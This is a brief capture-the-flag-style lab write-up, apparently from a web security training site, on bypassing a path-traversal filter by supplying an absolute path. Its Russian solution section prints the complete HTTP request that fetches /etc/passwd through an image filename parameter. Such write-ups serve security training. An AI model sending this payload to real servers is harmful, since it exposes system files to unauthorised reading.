# Lab: File path traversal, traversal sequences blocked with absolute path bypass
PRACTITIONER

This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.

## Решение
Попытки обратиться к "/etc/passwd" через родительские каталоги не принесли успеха, но обращение по прямому пути работает:
```
GET /image?filename=/etc/passwd HTTP/2
Host: 0af4000304b721d280feb292007d00d4.web-security-academy.net
Cookie: session=a7NzWUQDQFP6CP4pS4XH85fhC8nVC4v0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af4000304b721d280feb292007d00d4.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
```
Задание выполнено.
